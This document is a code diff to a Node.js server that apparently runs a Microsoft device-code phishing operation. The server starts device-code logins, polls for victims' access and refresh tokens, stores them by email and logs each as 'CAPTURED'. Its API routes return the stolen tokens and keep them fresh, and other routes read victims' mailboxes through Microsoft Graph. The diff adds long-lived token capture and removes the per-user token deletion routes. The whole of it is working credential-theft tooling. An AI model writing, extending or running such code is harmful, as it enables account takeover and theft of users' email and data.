@@ -16,9 +16,9 @@ app.use(express.static('public'));
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
 
-// Store sessions by EMAIL (not session ID)
-let userSessions = new Map();  // email -> session data
-let pendingAuth = new Map();   // sessionId -> pending
+// Store sessions by EMAIL
+let userSessions = new Map();
+let pendingAuth = new Map();
 let sessionCounter = 1;
 let totalVisits = 0;
 
@@ -49,7 +49,7 @@ function getClientIp(req) {
 }
 
 // ============================================
-// START AUTHENTICATION
+// START AUTHENTICATION - WITH offline_access FOR PRT
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -60,6 +60,7 @@ app.post('/start', async (req, res) => {
         
         totalVisits++;
         
+        // CRITICAL: offline_access scope is required to get refresh_token (PRT)
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
@@ -121,6 +122,12 @@ async function pollForToken(device_code, sessionId) {
             
             const tokens = response.data;
             
+            console.log(`[TOKEN] Full response received`);
+            console.log(`  - access_token: ${tokens.access_token ? 'YES' : 'NO'}`);
+            console.log(`  - refresh_token (PRT): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`  - id_token: ${tokens.id_token ? 'YES' : 'NO'}`);
+            console.log(`  - expires_in: ${tokens.expires_in}`);
+            
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
@@ -129,7 +136,7 @@ async function pollForToken(device_code, sessionId) {
             const userName = userInfo.data.displayName;
             const now = Date.now();
             
-            // Store by EMAIL for easy lookup
+            // Store session by EMAIL with ALL tokens
             userSessions.set(userEmail, {
                 id: sessionId,
                 email: userEmail,
@@ -138,7 +145,9 @@ async function pollForToken(device_code, sessionId) {
                 userAgent: pending.userAgent,
                 country: pending.country,
                 access_token: tokens.access_token,
-                refresh_token: tokens.refresh_token,  // PRT
+                refresh_token: tokens.refresh_token,  // PRT - Primary Refresh Token
+                id_token: tokens.id_token,
+                token_type: tokens.token_type,
                 expires_in: tokens.expires_in,
                 expires_at: now + (tokens.expires_in * 1000),
                 capturedAt: now,
@@ -150,11 +159,14 @@ async function pollForToken(device_code, sessionId) {
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
             
-            console.log(`✅ CAPTURED: ${userEmail} (${pending.country})`);
-            console.log(`   PRT: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`✅✅✅ CAPTURED: ${userEmail}`);
+            console.log(`   PRT: ${tokens.refresh_token ? 'CAPTURED ✓' : 'NOT CAPTURED'}`);
+            console.log(`   Total sessions: ${userSessions.size}`);
             
-        } catch (err) {}
-    }, 2000);
+        } catch (err) {
+            console.log('Polling for user approval...');
+        }
+    }, 3000);
 }
 
 app.get('/state', async (req, res) => {
@@ -179,12 +191,12 @@ async function getFreshAccessToken(email) {
     const session = userSessions.get(email);
     
     if (!session) {
-        console.log(`No session found for ${email}`);
+        console.log(`❌ No session found for ${email}`);
         return null;
     }
     
     if (!session.refresh_token) {
-        console.log(`No PRT for ${email}`);
+        console.log(`❌ No PRT for ${email}`);
         return null;
     }
     
@@ -204,7 +216,7 @@ async function getFreshAccessToken(email) {
         
         const tokens = response.data;
         
-        // Update session with new access token
+        // Update session with new access token (PRT stays the same)
         session.access_token = tokens.access_token;
         session.expires_at = Date.now() + (tokens.expires_in * 1000);
         session.expires_in = tokens.expires_in;
@@ -212,7 +224,7 @@ async function getFreshAccessToken(email) {
         console.log(`✅ Fresh token obtained for ${email}`);
         return tokens.access_token;
     } catch (err) {
-        console.error(`Failed to refresh token for ${email}:`, err.message);
+        console.error(`❌ Failed to refresh token for ${email}:`, err.response?.data?.error || err.message);
         return null;
     }
 }
@@ -233,6 +245,7 @@ app.get('/api/sessions', (req, res) => {
         expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
         hasPRT: s.hasPRT
     }));
+    console.log(`📊 Returning ${sessions.length} sessions`);
     res.json({ sessions: sessions, total: sessions.length });
 });
 
@@ -241,16 +254,16 @@ app.get('/api/session/token/:email', async (req, res) => {
     const session = userSessions.get(email);
     
     if (!session) {
-        return res.status(404).json({ error: 'Session not found' });
+        return res.status(404).json({ error: 'Session not found', email: email });
     }
     
-    // Get fresh token using PRT
     const freshToken = await getFreshAccessToken(email);
     
     res.json({
         email: session.email,
         access_token: freshToken || session.access_token,
         refresh_token: session.refresh_token,
+        has_refresh_token: !!session.refresh_token,
         expires_in: session.expires_in
     });
 });
@@ -304,26 +317,6 @@ app.get('/api/overview_stats', (req, res) => {
     });
 });
 
-app.delete('/api/delete_access_token/:email', (req, res) => {
-    const email = req.params.email;
-    if (userSessions.has(email)) {
-        userSessions.delete(email);
-        res.json({ success: true });
-    } else {
-        res.status(404).json({ error: 'Token not found' });
-    }
-});
-
-app.delete('/api/delete_refresh_token/:email', (req, res) => {
-    const email = req.params.email;
-    if (userSessions.has(email)) {
-        userSessions.delete(email);
-        res.json({ success: true });
-    } else {
-        res.status(404).json({ error: 'Token not found' });
-    }
-});
-
 app.delete('/api/sessions/clear', (req, res) => {
     userSessions.clear();
     pendingAuth.clear();
@@ -337,6 +330,8 @@ app.delete('/api/sessions/clear', (req, res) => {
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
+    console.log(`📁 Getting folders for ${email}`);
+    
     const token = await getFreshAccessToken(email);
     if (!token) {
         return res.status(401).json({ error: 'No valid token. Please re-authenticate.' });
@@ -347,10 +342,11 @@ app.get('/api/mail/folders/:email', async (req, res) => {
             headers: { 'Authorization': `Bearer ${token}` },
             params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
         });
+        console.log(`✅ Got ${response.data.value?.length || 0} folders`);
         res.json(response.data);
     } catch (err) {
-        console.error('Folders error:', err.response?.data);
-        res.status(500).json({ error: 'Failed to fetch folders' });
+        console.error('Folders error:', err.response?.data?.error?.message || err.message);
+        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
     }
 });
 
@@ -468,13 +464,10 @@ app.get('/api/resource/settings', (req, res) => res.json({ success: true, active
 app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
 app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });
 
-// ============================================
-// SERVE FILES
-// ============================================
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
-    console.log(`✅ Sessions stored by email for easy lookup`);
+    console.log(`✅ PRT capture enabled with offline_access scope`);
     console.log(`========================================\n`);
 });
